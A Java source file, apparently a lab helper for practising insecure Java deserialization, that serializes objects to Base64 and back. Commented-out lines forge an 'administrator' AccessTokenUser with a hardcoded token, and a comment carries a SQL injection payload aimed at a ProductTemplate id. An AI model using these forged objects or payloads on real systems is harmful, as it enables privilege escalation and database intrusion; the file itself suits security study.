import data.Foo;
import data.session.token.AccessTokenUser;
import data.productcatalog.ProductTemplate;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.Serializable;
import java.util.Base64;

class Main {
    public static void main(String[] args) throws Exception {
        // Foo originalObject = new Foo("str", 123);
        // String serializedObject = serialize(originalObject);
        // System.out.println("Serialized object: " + serializedObject);
        // Foo deserializedObject = deserialize(serializedObject);
        // System.out.println("Deserialized data str: " + deserializedObject.str + ", num: " + deserializedObject.num);

        // AccessTokenUser originalObject = new AccessTokenUser("administrator", "o08u5nnzhdey8dwoag8glp5vl9k3g1xxt");
        // String serializedObject = serialize(originalObject);
        // System.out.println("Serialized object: " + serializedObject);
        // AccessTokenUser deserializedObject = deserialize(serializedObject);
        // System.out.println("Deserialized data username: " + deserializedObject.getUsername() + ", access token: " + deserializedObject.getAccessToken());

        // SELECT * FROM products WHERE id = ''+UNION+SELECT+BANNER,+NULL+FROM+version()--' LIMIT 1
        ProductTemplate originalObject = new ProductTemplate("100");
        String serializedObject = serialize(originalObject);
        System.out.println("Serialized object: " + serializedObject);
        ProductTemplate deserializedObject = deserialize(serializedObject);
        System.out.println("Deserialized data id: " + deserializedObject.getId() + ", product name: " + deserializedObject.getProduct());
    }

    private static String serialize(Serializable obj) throws Exception {
        ByteArrayOutputStream baos = new ByteArrayOutputStream(512);
        try (ObjectOutputStream out = new ObjectOutputStream(baos)) {
            out.writeObject(obj);
        }
        return Base64.getEncoder().encodeToString(baos.toByteArray());
    }

    private static <T> T deserialize(String base64SerializedObj) throws Exception {
        try (ObjectInputStream in = new ObjectInputStream(new ByteArrayInputStream(Base64.getDecoder().decode(base64SerializedObj)))) {
            @SuppressWarnings("unchecked")
            T obj = (T) in.readObject();
            return obj;
        }
    }
}
